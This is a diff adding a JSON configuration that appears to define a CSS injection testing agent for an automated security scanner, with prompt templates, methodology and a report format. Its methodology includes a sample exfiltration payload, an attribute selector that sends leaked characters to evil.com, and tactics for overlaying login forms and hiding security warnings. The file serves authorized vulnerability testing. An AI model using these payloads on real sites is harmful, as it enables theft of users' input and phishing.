@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/css_injection",
+  "version": "1.0.0",
+  "title": "CSS Injection Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-79"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "read_only",
+  "methodology": "# CSS Injection Specialist Agent\n## User Prompt\nYou are testing **{target}** for CSS Injection vulnerabilities.\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Identify Injection Points\n- Style attributes: `style=\"user_input\"`\n- CSS files with user input\n- Class name injection\n### 2. Data Exfiltration via CSS\n- Attribute selectors: `input[value^=\"a\"]{background:url(https://evil.com/?char=a)}`\n- Font-based: `@font-face` with unicode-range\n- Scroll-to-text: `:target` selector leaks\n### 3. UI Manipulation\n- Overlay login forms with CSS positioning\n- Hide security warnings\n- Make invisible clickable areas\n### 4. Report\n```\nFINDING:\n- Title: CSS Injection at [endpoint]\n- Severity: Medium\n- CWE: CWE-79\n- Endpoint: [URL]\n- Payload: [CSS payload]\n- Impact: Data exfiltration, UI manipulation, phishing\n- Remediation: Sanitize CSS, use CSP style-src\n```\n## System Prompt\nYou are a CSS Injection specialist. CSS injection is confirmed when user input is rendered in a CSS context and can exfiltrate data or manipulate UI. Pure cosmetic changes are low impact. Focus on data exfiltration via attribute selectors and phishing via UI overlay.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/css_injection.md",
+  "warnings": []
+}
